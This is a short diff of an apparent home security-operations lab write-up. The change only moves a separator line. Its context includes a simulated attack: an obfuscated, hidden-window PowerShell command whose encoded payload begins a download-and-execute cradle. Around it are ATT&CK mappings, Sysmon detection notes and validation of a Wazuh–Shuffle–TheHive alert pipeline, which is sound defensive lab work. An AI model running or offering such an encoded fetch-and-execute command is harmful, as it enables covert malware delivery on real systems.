@@ -219,7 +219,6 @@ powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd
 - Tactic: Execution (TA0002), Defense Evasion (TA0005)
 - Technique: Command and Scripting Interpreter — PowerShell (T1059.001), Obfuscated Files or Information (T1027)
 - Detection: Sysmon Event ID 1 (encoded command parameter), Event ID 3 (outbound C2 connection)
----
 
 **Splunk Detection Query**
 ```spl
@@ -237,6 +236,7 @@ The execution of the attacks successfully validates the structural engineering o
 * **Detection Validation:** Wazuh consumes the high-fidelity Event Channel telemetry logs and successfully cross-matches signature criteria against pre-built rulesets, generating Tier-1 alerts on the indexer dashboard.
 * **Orchestration Validation:** The Wazuh Manager issues a secure Webhook out to Shuffle SOAR containing the raw JSON document structure of the active alert.
 * **Case Generation Validation:** Shuffle intercepts the payload data, strips out environmental white-noise parameters, executes automated alert enrichment steps, and runs a programmatic POST request out to TheHive API, successfully publishing an active incident response investigation ticket.
+---
 
 ## References & Acknowledgements
 Building a comprehensive SOC from scratch requires standing on the shoulders of the cybersecurity community. This infrastructure and deployment methodology was heavily inspired by the following educational resources:
